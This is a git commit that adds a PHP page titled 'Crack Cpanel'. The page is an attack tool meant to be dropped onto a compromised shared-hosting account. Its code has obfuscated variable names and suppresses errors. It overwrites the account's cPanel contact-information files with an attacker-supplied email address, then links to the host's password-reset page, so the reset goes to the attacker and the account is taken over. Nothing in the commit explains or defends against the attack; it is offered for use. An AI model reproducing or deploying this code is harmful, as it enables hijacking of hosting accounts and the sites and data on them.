ef35fd4241f91307b49c5184bcbfd5559d3ac931
Emperror7 <137810843+Emperror7@users.noreply.github.com>
2023-08-23 17:50:32 +0700

    Add files via upload

---
+++ cpanel-decode.php
@@ -0,0 +1,61 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>WIBUHAX0R1337 - Crack Cpanel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<meta name="description" content=" Bapak Lu Janda :v">
+<link
+href="https://fonts.googleapis.com/css?family=Kelly+Slab"
+rel="stylesheet" type="text/css">
+<style>
+body {
+         font-family: 'Ubuntu', sans-serif;
+	 background-color:black;
+        color: white;
+    	background-size:cover;
+        background-attachment: fixed;
+	}
+
+	
+input {
+  background-color: black;
+  font-family: monospace;
+  font-size: 15px;
+  color: #FF1493;
+  border: 2px solid #FF1493;
+  text-shadow: 5px 5px 30px #FF1493;
+  box-sizing: border-box;
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 10px;
+}
+</Style>
+<body>
+<center>
+<H1>WIBUHAXOR1337 - CPANEL CRACK</H1>
+<form action="#" method="post"> 
+<input type="email" name="email" placeholder="Email Lu Tong" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
+	</form> 	 	 
+	<br/><br/><br/> 
+<?php 
+error_reporting(0);
+set_time_limit(0);
+
+$IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf)
+ { 
+echo "<center><h1>Can't Be Accessed!!!</h1>
+	<br><br> 
+	</pre>
+	</center>"; 
+} else { echo "<center>Salin<br><br>
+	</center>"; 
+echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Crack!!!</a><br><br></center>'; ;}
+	echo '</td></tr><tr><td>';
+	}
+ elseif($_GET['logout'] == true) {
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+}
+?>
+
